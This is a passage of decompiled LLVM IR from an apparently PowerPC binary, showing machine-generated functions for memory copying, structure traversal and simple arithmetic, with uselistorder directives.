  %v0_1000ba30 = call i32 @function_1000cf4c()
  br label %dec_label_pc_1000ba34

dec_label_pc_1000ba34:                            ; preds = %dec_label_pc_1000b93c, %dec_label_pc_1000ba0c, %dec_label_pc_1000b990, %dec_label_pc_1000ba28
  store i32 %v0_1000b93c, i32* %r0.global-to-local, align 4
  %v0_1000ba38 = load i32, i32* @r31, align 4
  ret i32 %v0_1000ba38

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32, i32)* @function_1000c548, { 44, 7, 45, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 3, 2, 1, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5, 4, 0 }
  uselistorder i32 512, { 6, 8, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 ()* @function_1000b3f0, { 30, 29, 28, 12, 11, 10, 9, 45, 8, 7, 37, 36, 14, 44, 43, 42, 41, 40, 39, 38, 35, 34, 33, 32, 31, 27, 26, 25, 24, 23, 6, 22, 21, 20, 19, 18, 17, 16, 15, 13, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 18432, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba34, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000ba0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9ec, { 1, 0 }
}

define i32 @function_1000ba4c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1000ba4c:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v0_1000ba50 = load i32, i32* @lr, align 4
  store i32 %v0_1000ba50, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000ba68 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000ba68, i32* @r3, align 4
  %v3_1000ba74 = call i32 @function_1000cf54(i32 %v2_1000ba68, i32 ptrtoint ([3 x i8]* @global_var_1000cf4c.486 to i32))
  %v0_1000ba7c = call i32 @function_1000cf4c()
  br label %dec_label_pc_1000ba80

dec_label_pc_1000ba80:                            ; preds = %dec_label_pc_1000babc, %dec_label_pc_1000ba4c
  %v0_1000ba80 = load i32, i32* @r31, align 4
  %v1_1000ba80 = add i32 %v0_1000ba80, 4
  %v2_1000ba80 = inttoptr i32 %v1_1000ba80 to i32*
  %v3_1000ba80 = load i32, i32* %v2_1000ba80, align 4
  store i32 %v3_1000ba80, i32* %r0.global-to-local, align 4
  %v1_1000ba84 = add i32 %v0_1000ba80, 8
  %v2_1000ba84 = inttoptr i32 %v1_1000ba84 to i32*
  %v3_1000ba84 = load i32, i32* %v2_1000ba84, align 4
  store i32 %v3_1000ba84, i32* %r9.global-to-local, align 4
  %v3_1000ba88 = icmp ugt i32 %v3_1000ba84, %v3_1000ba80
  br i1 %v3_1000ba88, label %dec_label_pc_1000babc, label %dec_label_pc_1000ba90

dec_label_pc_1000ba90:                            ; preds = %dec_label_pc_1000ba80
  %v1_1000ba90 = inttoptr i32 %v0_1000ba80 to i32*
  %v2_1000ba90 = load i32, i32* %v1_1000ba90, align 4
  store i32 %v2_1000ba90, i32* @r3, align 4
  %v1_1000ba94 = add i32 %v0_1000ba80, 12
  %v2_1000ba94 = inttoptr i32 %v1_1000ba94 to i32*
  %v3_1000ba94 = load i32, i32* %v2_1000ba94, align 4
  %v1_1000ba98 = add i32 %v0_1000ba80, 20
  %v2_1000ba98 = inttoptr i32 %v1_1000ba98 to i32*
  %v3_1000ba98 = load i32, i32* %v2_1000ba98, align 4
  store i32 %v3_1000ba98, i32* @r5, align 4
  store i32 268483232, i32* @lr, align 4
  %v4_1000ba9c = inttoptr i32 %v2_1000ba90 to i32*
  %v5_1000ba9c = call i32 @function_1000d39c(i32* %v4_1000ba9c, i32 %v3_1000ba94, i32 %v3_1000ba98, i32 %v3_1000ba84)
  %v2_1000baa0 = icmp sgt i32 %v5_1000ba9c, 0
  br i1 %v2_1000baa0, label %dec_label_pc_1000bab0, label %dec_label_pc_1000baa8

dec_label_pc_1000baa8:                            ; preds = %dec_label_pc_1000ba90
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_1000bae8

dec_label_pc_1000bab0:                            ; preds = %dec_label_pc_1000ba90
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000bab4 = load i32, i32* @r31, align 4
  %v2_1000bab4 = add i32 %v1_1000bab4, 8
  %v3_1000bab4 = inttoptr i32 %v2_1000bab4 to i32*
  store i32 %v5_1000ba9c, i32* %v3_1000bab4, align 4
  %v0_1000bab8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bab8 = load i32, i32* @r31, align 4
  %v2_1000bab8 = add i32 %v1_1000bab8, 4
  %v3_1000bab8 = inttoptr i32 %v2_1000bab8 to i32*
  store i32 %v0_1000bab8, i32* %v3_1000bab8, align 4
  %v0_1000babc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000babc

dec_label_pc_1000babc:                            ; preds = %dec_label_pc_1000ba80, %dec_label_pc_1000bab0
  %v1_1000bad0 = phi i32 [ %v0_1000ba80, %dec_label_pc_1000ba80 ], [ %v0_1000babc.pre, %dec_label_pc_1000bab0 ]
  %v1_1000babc = add i32 %v1_1000bad0, 4
  %v2_1000babc = inttoptr i32 %v1_1000babc to i32*
  %v3_1000babc = load i32, i32* %v2_1000babc, align 4
  store i32 %v3_1000babc, i32* %r9.global-to-local, align 4
  %v1_1000bac0 = add i32 %v1_1000bad0, 12
  %v2_1000bac0 = inttoptr i32 %v1_1000bac0 to i32*
  %v3_1000bac0 = load i32, i32* %v2_1000bac0, align 4
  store i32 %v3_1000bac0, i32* %r11.global-to-local, align 4
  %v2_1000bac4 = add i32 %v3_1000bac0, %v3_1000babc
  store i32 %v2_1000bac4, i32* @r29, align 4
  %v1_1000bac8 = add i32 %v2_1000bac4, 8
  %v2_1000bac8 = inttoptr i32 %v1_1000bac8 to i16*
  %v3_1000bac8 = load i16, i16* %v2_1000bac8, align 2
  %v4_1000bac8 = zext i16 %v3_1000bac8 to i32
  %v2_1000bacc = add i32 %v4_1000bac8, %v3_1000babc
  store i32 %v2_1000bacc, i32* %r0.global-to-local, align 4
  store i32 %v2_1000bacc, i32* %v2_1000babc, align 4
  %v0_1000bad4 = load i32, i32* @r29, align 4
  %v1_1000bad4 = add i32 %v0_1000bad4, 4
  %v2_1000bad4 = inttoptr i32 %v1_1000bad4 to i32*
  %v3_1000bad4 = load i32, i32* %v2_1000bad4, align 4
  store i32 %v3_1000bad4, i32* %r0.global-to-local, align 4
  %v1_1000bad8 = load i32, i32* @r31, align 4
  %v2_1000bad8 = add i32 %v1_1000bad8, 16
  %v3_1000bad8 = inttoptr i32 %v2_1000bad8 to i32*
  store i32 %v3_1000bad4, i32* %v3_1000bad8, align 4
  %v0_1000badc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000badc = load i32, i32* %r11.global-to-local, align 4
  %v2_1000badc = add i32 %v1_1000badc, %v0_1000badc
  %v3_1000badc = inttoptr i32 %v2_1000badc to i32*
  %v4_1000badc = load i32, i32* %v3_1000badc, align 4
  store i32 %v4_1000badc, i32* %r0.global-to-local, align 4
  %v3_1000bae0 = icmp eq i32 %v4_1000badc, 0
  br i1 %v3_1000bae0, label %dec_label_pc_1000ba80, label %dec_label_pc_1000bae8

dec_label_pc_1000bae8:                            ; preds = %dec_label_pc_1000babc, %dec_label_pc_1000baa8
  store i32 %v2_1000ba68, i32* @r3, align 4
  %v2_1000baf0 = call i32 @function_1000cf54(i32 %v2_1000ba68, i32 1)
  store i32 %v0_1000ba50, i32* %r0.global-to-local, align 4
  %v0_1000baf8 = load i32, i32* @r29, align 4
  ret i32 %v0_1000baf8

; uselistorder directives
  uselistorder i32 %v1_1000bad0, { 1, 0 }
  uselistorder i32 %v0_1000ba80, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_1000ba68, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000babc, { 1, 0 }
}

define i32 @function_1000bb0c() local_unnamed_addr {
dec_label_pc_1000bb0c:
  ret i32 ptrtoint (i32* @global_var_1001eb68.491 to i32)
}

define i32 @function_1000bb18(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000bb18:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_1000bb20 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268483372, i32* @lr, align 4
  %v1_1000bb28 = call i32 @function_1000d7dc(i32 %v2_1000bb20)
  %v3_1000bb30 = load i32, i32* %stack_var_-24, align 4
  %v2_1000bb34 = add i32 %v3_1000bb30, %tmp
  %v1_1000bb3c = mul i32 %v2_1000bb34, 10000
  %v1_1000bb48 = and i32 %v1_1000bb3c, 2147483632
  ret i32 %v1_1000bb48
}

define i32 @function_1000bb50() local_unnamed_addr {
dec_label_pc_1000bb50:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000bb50 = load i32, i32* @r5, align 4
  %v1_1000bb50 = call i32 @__asm_rlwinm.(i32 %v0_1000bb50, i32 29, i32 3, i32 31)
  store i32 %v1_1000bb50, i32* %r9.global-to-local, align 4
  %v4_1000bb50 = icmp eq i32 %v1_1000bb50, 0
  %v0_1000bb54 = load i32, i32* @r4, align 4
  %v1_1000bb54 = add i32 %v0_1000bb54, -4
  store i32 %v1_1000bb54, i32* %r4.global-to-local, align 4
  %v0_1000bb58 = load i32, i32* @r3, align 4
  %v1_1000bb58 = add i32 %v0_1000bb58, -4
  store i32 %v1_1000bb58, i32* @r11, align 4
  br i1 %v4_1000bb50, label %dec_label_pc_1000bb80, label %dec_label_pc_1000bb60

dec_label_pc_1000bb60:                            ; preds = %dec_label_pc_1000bb50
  %v1_1000bb60 = urem i32 %v1_1000bb58, 4
  %v3_1000bb60 = icmp eq i32 %v1_1000bb60, 0
  br i1 %v3_1000bb60, label %dec_label_pc_1000bb68, label %dec_label_pc_1000bbbc

dec_label_pc_1000bb68:                            ; preds = %dec_label_pc_1000bbdc.dec_label_pc_1000bb68_crit_edge, %dec_label_pc_1000bb60
  %v1_1000bb74.pre = phi i32 [ %v1_1000bb58, %dec_label_pc_1000bb60 ], [ %v1_1000bb74.pre.pre, %dec_label_pc_1000bbdc.dec_label_pc_1000bb68_crit_edge ]
  %v0_1000bb68 = phi i32 [ %v1_1000bb50, %dec_label_pc_1000bb60 ], [ %v1_1000bbdc, %dec_label_pc_1000bbdc.dec_label_pc_1000bb68_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1000bb60 ], [ %v2_1000bbc4, %dec_label_pc_1000bbdc.dec_label_pc_1000bb68_crit_edge ]
  store i32 %v0_1000bb68, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000bb6c

dec_label_pc_1000bb6c:                            ; preds = %dec_label_pc_1000bb6c, %dec_label_pc_1000bb68
  %v1_1000bb74 = phi i32 [ %v2_1000bb78, %dec_label_pc_1000bb6c ], [ %v1_1000bb74.pre, %dec_label_pc_1000bb68 ]
  %v0_1000bb6c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000bb6c = add i32 %v0_1000bb6c, 4
  %v2_1000bb6c = inttoptr i32 %v1_1000bb6c to i32*
  %v3_1000bb6c = load i32, i32* %v2_1000bb6c, align 4
  %v1_1000bb70 = add i32 %v0_1000bb6c, 8
  %v2_1000bb70 = inttoptr i32 %v1_1000bb70 to i32*
  %v3_1000bb70 = load i32, i32* %v2_1000bb70, align 4
  store i32 %v3_1000bb70, i32* %r9.global-to-local, align 4
  store i32 %v1_1000bb70, i32* %r4.global-to-local, align 4
  %v2_1000bb74 = add i32 %v1_1000bb74, 4
  %v3_1000bb74 = inttoptr i32 %v2_1000bb74 to i32*
  store i32 %v3_1000bb6c, i32* %v3_1000bb74, align 4
  %v0_1000bb78 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bb78 = load i32, i32* @r11, align 4
  %v2_1000bb78 = add i32 %v1_1000bb78, 8
  %v3_1000bb78 = inttoptr i32 %v2_1000bb78 to i32*
  store i32 %v0_1000bb78, i32* %v3_1000bb78, align 4
  store i32 %v2_1000bb78, i32* @r11, align 4
  %v0_1000bb7c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bb7c = add i32 %v0_1000bb7c, -1
  store i32 %v1_1000bb7c, i32* %ctr.global-to-local, align 4
  %v2_1000bb7c = icmp eq i32 %v1_1000bb7c, 0
  br i1 %v2_1000bb7c, label %dec_label_pc_1000bb80, label %dec_label_pc_1000bb6c

dec_label_pc_1000bb80:                            ; preds = %dec_label_pc_1000bb6c, %dec_label_pc_1000bbdc, %dec_label_pc_1000bb50
  %.1 = phi i32 [ undef, %dec_label_pc_1000bb50 ], [ %v2_1000bbc4, %dec_label_pc_1000bbdc ], [ %.0, %dec_label_pc_1000bb6c ]
  %v1_1000bb80 = urem i32 %.1, 8
  store i32 %v1_1000bb80, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000bb80, 4
  br i1 %tmp, label %dec_label_pc_1000bb98, label %dec_label_pc_1000bb8c

dec_label_pc_1000bb8c:                            ; preds = %dec_label_pc_1000bb80
  %v0_1000bb8c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000bb8c = add i32 %v0_1000bb8c, 4
  %v2_1000bb8c = inttoptr i32 %v1_1000bb8c to i32*
  %v3_1000bb8c = load i32, i32* %v2_1000bb8c, align 4
  store i32 %v1_1000bb8c, i32* %r4.global-to-local, align 4
  %v1_1000bb90 = add nsw i32 %v1_1000bb80, -4
  store i32 %v1_1000bb90, i32* @r5, align 4
  %v1_1000bb94 = load i32, i32* @r11, align 4
  %v2_1000bb94 = add i32 %v1_1000bb94, 4
  %v3_1000bb94 = inttoptr i32 %v2_1000bb94 to i32*
  store i32 %v3_1000bb8c, i32* %v3_1000bb94, align 4
  store i32 %v2_1000bb94, i32* @r11, align 4
  %v0_1000bb98.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000bb98

dec_label_pc_1000bb98:                            ; preds = %dec_label_pc_1000bb80, %dec_label_pc_1000bb8c
  %v0_1000bb98 = phi i32 [ %v1_1000bb80, %dec_label_pc_1000bb80 ], [ %v0_1000bb98.pre, %dec_label_pc_1000bb8c ]
  %v3_1000bb98 = icmp eq i32 %v0_1000bb98, 0
  %v0_1000bb9c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000bb98, i32 %v0_1000bb9c)
  %v0_1000bba0 = load i32, i32* @r5, align 4
  store i32 %v0_1000bba0, i32* %ctr.global-to-local, align 4
  %v0_1000bba4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000bba4 = add i32 %v0_1000bba4, 3
  store i32 %v1_1000bba4, i32* %r4.global-to-local, align 4
  %v0_1000bba8 = load i32, i32* @r11, align 4
  %v1_1000bba8 = add i32 %v0_1000bba8, 3
  store i32 %v1_1000bba8, i32* %r9.global-to-local, align 4
  %v1_1000bbac9 = add i32 %v0_1000bba4, 4
  %v2_1000bbac10 = inttoptr i32 %v1_1000bbac9 to i8*
  %v3_1000bbac11 = load i8, i8* %v2_1000bbac10, align 1
  store i32 %v1_1000bbac9, i32* %r4.global-to-local, align 4
  %v3_1000bbb013 = add i32 %v0_1000bba8, 4
  %v4_1000bbb014 = inttoptr i32 %v3_1000bbb013 to i8*
  store i8 %v3_1000bbac11, i8* %v4_1000bbb014, align 1
  store i32 %v3_1000bbb013, i32* %r9.global-to-local, align 4
  %v0_1000bbb415 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bbb416 = add i32 %v0_1000bbb415, -1
  store i32 %v1_1000bbb416, i32* %ctr.global-to-local, align 4
  %v2_1000bbb417 = icmp eq i32 %v1_1000bbb416, 0
  br i1 %v2_1000bbb417, label %dec_label_pc_1000bbe8, label %dec_label_pc_1000bbac.dec_label_pc_1000bbac_crit_edge

dec_label_pc_1000bbac.dec_label_pc_1000bbac_crit_edge: ; preds = %dec_label_pc_1000bb98, %dec_label_pc_1000bbac.dec_label_pc_1000bbac_crit_edge
  %v3_1000bbb018 = phi i32 [ %v3_1000bbb0, %dec_label_pc_1000bbac.dec_label_pc_1000bbac_crit_edge ], [ %v3_1000bbb013, %dec_label_pc_1000bb98 ]
  %v0_1000bbac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000bbac = add i32 %v0_1000bbac.pre, 1
  %v2_1000bbac = inttoptr i32 %v1_1000bbac to i8*
  %v3_1000bbac = load i8, i8* %v2_1000bbac, align 1
  store i32 %v1_1000bbac, i32* %r4.global-to-local, align 4
  %v3_1000bbb0 = add i32 %v3_1000bbb018, 1
  %v4_1000bbb0 = inttoptr i32 %v3_1000bbb0 to i8*
  store i8 %v3_1000bbac, i8* %v4_1000bbb0, align 1
  store i32 %v3_1000bbb0, i32* %r9.global-to-local, align 4
  %v0_1000bbb4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bbb4 = add i32 %v0_1000bbb4, -1
  store i32 %v1_1000bbb4, i32* %ctr.global-to-local, align 4
  %v2_1000bbb4 = icmp eq i32 %v1_1000bbb4, 0
  br i1 %v2_1000bbb4, label %dec_label_pc_1000bbe8, label %dec_label_pc_1000bbac.dec_label_pc_1000bbac_crit_edge

dec_label_pc_1000bbbc:                            ; preds = %dec_label_pc_1000bb60
  %v1_1000bbbc = sub nsw i32 4, %v1_1000bb60
  store i32 %v1_1000bbbc, i32* %ctr.global-to-local, align 4
  %v1_1000bbc4 = load i32, i32* @r5, align 4
  %v2_1000bbc4 = sub i32 %v1_1000bbc4, %v1_1000bbbc
  br label %dec_label_pc_1000bbc8

dec_label_pc_1000bbc8:                            ; preds = %dec_label_pc_1000bbc8.dec_label_pc_1000bbc8_crit_edge, %dec_label_pc_1000bbbc
  %v2_1000bbd0 = phi i32 [ %v1_1000bbd4, %dec_label_pc_1000bbc8.dec_label_pc_1000bbc8_crit_edge ], [ %v1_1000bb58, %dec_label_pc_1000bbbc ]
  %v0_1000bbc8 = phi i32 [ %v0_1000bbc8.pre, %dec_label_pc_1000bbc8.dec_label_pc_1000bbc8_crit_edge ], [ %v1_1000bb54, %dec_label_pc_1000bbbc ]
  %v1_1000bbc8 = add i32 %v0_1000bbc8, 4
  %v2_1000bbc8 = inttoptr i32 %v1_1000bbc8 to i8*
  %v3_1000bbc8 = load i8, i8* %v2_1000bbc8, align 1
  %v1_1000bbcc = add i32 %v0_1000bbc8, 1
  store i32 %v1_1000bbcc, i32* %r4.global-to-local, align 4
  %v3_1000bbd0 = add i32 %v2_1000bbd0, 4
  %v4_1000bbd0 = inttoptr i32 %v3_1000bbd0 to i8*
  store i8 %v3_1000bbc8, i8* %v4_1000bbd0, align 1
  %v0_1000bbd4 = load i32, i32* @r11, align 4
  %v1_1000bbd4 = add i32 %v0_1000bbd4, 1
  store i32 %v1_1000bbd4, i32* @r11, align 4
  %v0_1000bbd8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bbd8 = add i32 %v0_1000bbd8, -1
  store i32 %v1_1000bbd8, i32* %ctr.global-to-local, align 4
  %v2_1000bbd8 = icmp eq i32 %v1_1000bbd8, 0
  br i1 %v2_1000bbd8, label %dec_label_pc_1000bbdc, label %dec_label_pc_1000bbc8.dec_label_pc_1000bbc8_crit_edge

dec_label_pc_1000bbc8.dec_label_pc_1000bbc8_crit_edge: ; preds = %dec_label_pc_1000bbc8
  %v0_1000bbc8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000bbc8

dec_label_pc_1000bbdc:                            ; preds = %dec_label_pc_1000bbc8
  %v1_1000bbdc = call i32 @__asm_rlwinm.(i32 %v2_1000bbc4, i32 29, i32 3, i32 31)
  store i32 %v1_1000bbdc, i32* %r9.global-to-local, align 4
  %v4_1000bbdc = icmp eq i32 %v1_1000bbdc, 0
  br i1 %v4_1000bbdc, label %dec_label_pc_1000bb80, label %dec_label_pc_1000bbdc.dec_label_pc_1000bb68_crit_edge

dec_label_pc_1000bbdc.dec_label_pc_1000bb68_crit_edge: ; preds = %dec_label_pc_1000bbdc
  %v1_1000bb74.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000bb68

dec_label_pc_1000bbe8:                            ; preds = %dec_label_pc_1000bbac.dec_label_pc_1000bbac_crit_edge, %dec_label_pc_1000bb98
  %v0_1000bbe8 = load i32, i32* @r3, align 4
  ret i32 %v0_1000bbe8

; uselistorder directives
  uselistorder i32 %v1_1000bbdc, { 1, 2, 0 }
  uselistorder i32 %v1_1000bbd8, { 1, 0 }
  uselistorder i32 %v1_1000bbd4, { 1, 0 }
  uselistorder i32 %v0_1000bbc8, { 1, 0 }
  uselistorder i32 %v2_1000bbc4, { 2, 1, 0 }
  uselistorder i32 %v1_1000bbb4, { 1, 0 }
  uselistorder i32 %v3_1000bbb0, { 1, 2, 0 }
  uselistorder i32 %v1_1000bb80, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000bb7c, { 1, 0 }
  uselistorder i32 %v2_1000bb78, { 1, 2, 0 }
  uselistorder i32 %v1_1000bb60, { 1, 0 }
  uselistorder i32 %v1_1000bb58, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_1000bbac.dec_label_pc_1000bbac_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb98, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb80, { 1, 0, 2 }
}

define i32 @function_1000bbec(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bbec:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_1000bbec = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* @r11, align 4
  br i1 %v2_1000bbec, label %dec_label_pc_1000bc00, label %dec_label_pc_1000bbfc

dec_label_pc_1000bbfc:                            ; preds = %dec_label_pc_1000bbec
  %v0_1000bbfc = call i32 @function_1000bb50()
  store i32 %v0_1000bbfc, i32* @r3, align 4
  br label %dec_label_pc_1000bc00

dec_label_pc_1000bc00:                            ; preds = %dec_label_pc_1000bbec, %dec_label_pc_1000bbfc
  %v1_1000bc00 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_1000bc00, i32* %r9.global-to-local, align 4
  %v4_1000bc00 = icmp eq i32 %v1_1000bc00, 0
  %v2_1000bc04 = add i32 %arg3, %arg2
  store i32 %v2_1000bc04, i32* %r4.global-to-local, align 4
  %v0_1000bc08 = load i32, i32* @r3, align 4
  %v2_1000bc08 = add i32 %v0_1000bc08, %arg3
  store i32 %v2_1000bc08, i32* %r10.global-to-local, align 4
  br i1 %v4_1000bc00, label %dec_label_pc_1000bc30, label %dec_label_pc_1000bc10

dec_label_pc_1000bc10:                            ; preds = %dec_label_pc_1000bc00
  %v1_1000bc10 = urem i32 %v2_1000bc08, 4
  %v3_1000bc10 = icmp eq i32 %v1_1000bc10, 0
  br i1 %v3_1000bc10, label %dec_label_pc_1000bc18, label %dec_label_pc_1000bc64

dec_label_pc_1000bc18:                            ; preds = %dec_label_pc_1000bc7c.dec_label_pc_1000bc18_crit_edge, %dec_label_pc_1000bc10
  %v1_1000bc24.pre = phi i32 [ %v1_1000bc24.pre.pre, %dec_label_pc_1000bc7c.dec_label_pc_1000bc18_crit_edge ], [ %v2_1000bc08, %dec_label_pc_1000bc10 ]
  %v0_1000bc18 = phi i32 [ %v1_1000bc7c, %dec_label_pc_1000bc7c.dec_label_pc_1000bc18_crit_edge ], [ %v1_1000bc00, %dec_label_pc_1000bc10 ]
  store i32 %v0_1000bc18, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000bc1c

dec_label_pc_1000bc1c:                            ; preds = %dec_label_pc_1000bc1c, %dec_label_pc_1000bc18
  %v1_1000bc24 = phi i32 [ %v2_1000bc28, %dec_label_pc_1000bc1c ], [ %v1_1000bc24.pre, %dec_label_pc_1000bc18 ]
  %v0_1000bc1c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000bc1c = add i32 %v0_1000bc1c, -4
  %v2_1000bc1c = inttoptr i32 %v1_1000bc1c to i32*
  %v3_1000bc1c = load i32, i32* %v2_1000bc1c, align 4
  %v1_1000bc20 = add i32 %v0_1000bc1c, -8
  %v2_1000bc20 = inttoptr i32 %v1_1000bc20 to i32*
  %v3_1000bc20 = load i32, i32* %v2_1000bc20, align 4
  store i32 %v3_1000bc20, i32* %r9.global-to-local, align 4
  store i32 %v1_1000bc20, i32* %r4.global-to-local, align 4
  %v2_1000bc24 = add i32 %v1_1000bc24, -4
  %v3_1000bc24 = inttoptr i32 %v2_1000bc24 to i32*
  store i32 %v3_1000bc1c, i32* %v3_1000bc24, align 4
  %v0_1000bc28 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bc28 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000bc28 = add i32 %v1_1000bc28, -8
  %v3_1000bc28 = inttoptr i32 %v2_1000bc28 to i32*
  store i32 %v0_1000bc28, i32* %v3_1000bc28, align 4
  store i32 %v2_1000bc28, i32* %r10.global-to-local, align 4
  %v0_1000bc2c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bc2c = add i32 %v0_1000bc2c, -1
  store i32 %v1_1000bc2c, i32* %ctr.global-to-local, align 4
  %v2_1000bc2c = icmp eq i32 %v1_1000bc2c, 0
  br i1 %v2_1000bc2c, label %dec_label_pc_1000bc30, label %dec_label_pc_1000bc1c

dec_label_pc_1000bc30:                            ; preds = %dec_label_pc_1000bc1c, %dec_label_pc_1000bc7c, %dec_label_pc_1000bc00
  %v0_1000bc30 = load i32, i32* @r11, align 4
  %v1_1000bc30 = urem i32 %v0_1000bc30, 8
  store i32 %v1_1000bc30, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_1000bc30, 4
  br i1 %tmp, label %dec_label_pc_1000bc48, label %dec_label_pc_1000bc3c

dec_label_pc_1000bc3c:                            ; preds = %dec_label_pc_1000bc30
  %v0_1000bc3c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000bc3c = add i32 %v0_1000bc3c, -4
  %v2_1000bc3c = inttoptr i32 %v1_1000bc3c to i32*
  %v3_1000bc3c = load i32, i32* %v2_1000bc3c, align 4
  store i32 %v1_1000bc3c, i32* %r4.global-to-local, align 4
  %v1_1000bc40 = add nsw i32 %v1_1000bc30, -4
  store i32 %v1_1000bc40, i32* %r5.global-to-local, align 4
  %v1_1000bc44 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000bc44 = add i32 %v1_1000bc44, -4
  %v3_1000bc44 = inttoptr i32 %v2_1000bc44 to i32*
  store i32 %v3_1000bc3c, i32* %v3_1000bc44, align 4
  store i32 %v2_1000bc44, i32* %r10.global-to-local, align 4
  %v0_1000bc48.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000bc48

dec_label_pc_1000bc48:                            ; preds = %dec_label_pc_1000bc30, %dec_label_pc_1000bc3c
  %v0_1000bc50 = phi i32 [ %v1_1000bc30, %dec_label_pc_1000bc30 ], [ %v0_1000bc48.pre, %dec_label_pc_1000bc3c ]
  %v3_1000bc48 = icmp eq i32 %v0_1000bc50, 0
  br i1 %v3_1000bc48, label %dec_label_pc_1000bc88, label %dec_label_pc_1000bc50

dec_label_pc_1000bc50:                            ; preds = %dec_label_pc_1000bc48
  store i32 %v0_1000bc50, i32* %ctr.global-to-local, align 4
  %v2_1000bc58.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000bc54

dec_label_pc_1000bc54:                            ; preds = %dec_label_pc_1000bc54, %dec_label_pc_1000bc50
  %v2_1000bc58 = phi i32 [ %v3_1000bc58, %dec_label_pc_1000bc54 ], [ %v2_1000bc58.pre, %dec_label_pc_1000bc50 ]
  %v0_1000bc54 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000bc54 = add i32 %v0_1000bc54, -1
  %v2_1000bc54 = inttoptr i32 %v1_1000bc54 to i8*
  %v3_1000bc54 = load i8, i8* %v2_1000bc54, align 1
  store i32 %v1_1000bc54, i32* %r4.global-to-local, align 4
  %v3_1000bc58 = add i32 %v2_1000bc58, -1
  %v4_1000bc58 = inttoptr i32 %v3_1000bc58 to i8*
  store i8 %v3_1000bc54, i8* %v4_1000bc58, align 1
  store i32 %v3_1000bc58, i32* %r10.global-to-local, align 4
  %v0_1000bc5c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bc5c = add i32 %v0_1000bc5c, -1
  store i32 %v1_1000bc5c, i32* %ctr.global-to-local, align 4
  %v2_1000bc5c = icmp eq i32 %v1_1000bc5c, 0
  br i1 %v2_1000bc5c, label %dec_label_pc_1000bc88, label %dec_label_pc_1000bc54

